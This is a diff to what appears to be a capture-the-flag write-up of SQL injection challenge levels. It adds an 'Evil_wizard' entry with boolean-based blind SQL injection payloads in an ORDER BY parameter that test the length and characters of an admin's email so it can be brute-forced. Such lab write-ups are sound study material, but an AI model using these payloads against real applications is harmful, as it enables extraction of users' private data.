@@ -405,7 +405,17 @@ Checks if the id is 'admin' AND the length of their email equals to value 'a'
 If true, it orders by column 1; if false, it orders by column 2
 We can see a change in the sorting of results, confirming the length/brute force 
 ```?email=admin%5Fsecure%5Femail@emai1.com```
-(PICTURE)
 
 ---
+
+## 24. Evil_wizard 
+
+**query :**
+```
+?order=CASE WHEN (id='admin' AND length(email)=1) THEN 1 ELSE 2 END 
+```
+```   
+?order=CASE WHEN (id='admin' AND substring(email,1,1)="1") THEN 1 ELSE 2 END
+```
+
 ***
